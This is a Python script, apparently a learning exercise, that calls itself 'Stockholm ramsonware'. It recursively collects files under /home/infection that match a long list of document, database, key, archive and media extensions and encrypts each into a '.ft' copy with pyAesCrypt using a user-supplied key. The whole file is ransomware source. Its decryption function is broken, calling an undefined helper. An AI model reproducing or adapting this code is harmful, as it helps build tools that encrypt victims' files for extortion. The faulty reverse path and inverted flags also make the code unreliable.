#!/usr/bin/env python3
import os
import argparse
import markdown
import webbrowser
from pathlib import Path
import pyAesCrypt

extensions = ('.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw',
              '.stw', '.uot', '.3ds', '.max', '.3dm', '.ods', '.ots', '.sxc', '.stc', '.dif',
              '.slk', '.wb2', '.odp', '.otp', '.sxd', '.std', '.uop', '.odg', '.otg', '.sxm',
              '.mml', '.lay', '.lay6', '.asc', '.sqlite3', '.sqlitedb', '.sql', '.accdb', '.mdb',
              '.db', '.dbf', '.odb', '.frm', '.myd', '.myi', '.ibd', '.mdf', '.ldf', '.sln',
              '.suo', '.cs', '.c', '.cpp', '.pas', '.h', '.asm', '.js', '.cmd', '.bat', '.ps1',
              '.vbs', '.vb', '.pl', '.dip', '.dch', '.sch', '.brd', '.jsp', '.php', '.asp', '.rb',
              '.java', '.jar', '.class', '.sh', '.mp3', '.wav', '.swf', '.fla', '.wmv', '.mpg',
              '.vob', '.mpeg', '.asf', '.avi', '.mov', '.mp4', '.3gp', '.mkv', '.3g2', '.flv',
              '.wma', '.mid', '.m3u', '.m4u', '.djvu', '.svg', '.ai', '.psd', '.nef', '.tiff',
              '.tif', '.cgm', '.raw', '.gif', '.png', '.bmp', '.jpg', '.jpeg', '.vcd', '.iso',
              '.backup', '.zip', '.rar', '.7z', '.gz', '.tgz', '.tar', '.bak', '.tbk', '.bz2',
              '.PAQ', '.ARC', '.aes', '.gpg', '.vmx', '.vmdk', '.vdi', '.sldm', '.sldx', '.sti',
              '.sxi', '.602', '.hwp', '.snt', '.onetoc2', '.dwg', '.pdf', '.wk1', '.wks', '.123',
              '.rtf', '.csv', '.txt', '.vsdx', '.vsd', '.edb', '.eml', '.msg', '.ost', '.pst',
              '.potm', '.potx', '.ppam', '.ppsx', '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt',
              '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls',
              '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', '.doc')

def get_files_list():
    path = "/home/infection"
    file_list = []
    if not os.path.exists(path):
        print("Error: path do not exits.\n")
    files = os.walk(path)
    for file in files:
        for f in file[2]:
            if f.endswith((extensions)):
                file_list.append(file[0] + "/" + f)
    return(file_list)

def encryptFiles(silent, key):
    files = get_files_list()
    for file in files:
        if (silent == True):
            print("Encrypting file", file, "to a new file", file + ".ft")
        pyAesCrypt.encryptFile(file, file + ".ft", key)
    

def decryptFiles(silent, key):
    files = get_files_ft()
    print(files)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='My own private ramsonware.', add_help=False)
    parser.add_argument('key', type=str, action='store', nargs='?')
    parser.add_argument('-r', '--reverse', action='store_true')
    parser.add_argument('-s', '--silent', action='store_true')
    parser.add_argument('-v', '--version', action='store_true')
    parser.add_argument('-h', '--help', action='store_true')
    args = parser.parse_args()
    if (args.help == True):
        with open('README.md', 'r+') as helper:
            markdown_string = helper.read()
            html_string =markdown.markdown(markdown_string)
        try:
            webbrowser.get()
            with open('README.html', 'w+') as h:
                h.write(html_string)
            this_directory = Path(__file__).parent
            webbrowser.open_new("file://"+str(this_directory)+"/"+"README.html")
        except:
            print(markdown_string)
        exit
    elif (args.version == True):
        print("Stockholm ramsonware version 1.0.0")
        exit
    elif (args.reverse == False and len(args.key) >= 16):
        encryptFiles(False, args.key)
        exit
    elif (args.reverse == True and len(args.key) >= 16):
        decryptFiles(True, args.key)
        exit
    elif (len(args.key) < 16):
        print("Your key must have at least 16 characters")
        exit
    else:
        print("Not allowed flag, please use flag -h to get some help.")
        exit
